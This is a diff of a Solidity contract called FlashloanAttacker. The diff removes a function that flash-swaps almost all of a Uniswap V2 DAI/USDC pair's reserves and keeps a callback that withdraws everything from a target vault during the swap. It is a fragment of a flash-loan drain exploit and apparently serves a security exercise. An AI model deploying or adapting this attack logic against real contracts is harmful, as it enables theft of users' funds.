@@ -9,9 +9,6 @@ contract FlashloanAttacker {
     using SafeERC20 for IERC20;
 
     IVault public vault;
-    
-    event Debug(uint256 value);
-
     IERC20 public constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     IERC20 public constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
@@ -49,19 +46,8 @@ contract FlashloanAttacker {
         }
     }
 
-    function performPoolDrainAttack() public {
-        uint256 daiAmount = dai.balanceOf(address(pair)) - 100;     // leave dust amount
-        uint256 usdcAmount = usdc.balanceOf(address(pair)) - 100;   // leave dust amount
-
-        bytes memory data = abi.encode(daiAmount * 1005 / 1000, usdcAmount * 1005 / 1000);  // Add extra fees as well ; todo: fix this to be exact amount
-
-        // Call swap to receive USDC from Pair
-        address token0 = pair.token0();
-        if (token0 == address(dai)) {
-            pair.swap(daiAmount, usdcAmount, address(this), data);
-        } else {
-            pair.swap(daiAmount, usdcAmount, address(this), data);
-        }
+    function encodeHelper(uint256 daiAmount, uint256 usdcAmount) public returns (bytes memory) {
+        return abi.encode(daiAmount * 1005 / 1000, usdcAmount * 1005 / 1000);
     }
 
     function uniswapV2Call(
@@ -75,8 +61,7 @@ contract FlashloanAttacker {
         assert(msg.sender == address(pair)); // ensure that msg.sender is a V2 pair
 
         // Withdraw all from vault
-        uint256 value = vault.withdraw();
-        emit Debug(value);
+        vault.withdraw();
 
         // At the end of uniswapV2Call, contracts must return enough tokens to the pair to make it whole.
         // Specifically, this means that the product of the pair reserves after the swap, discounting all token amounts
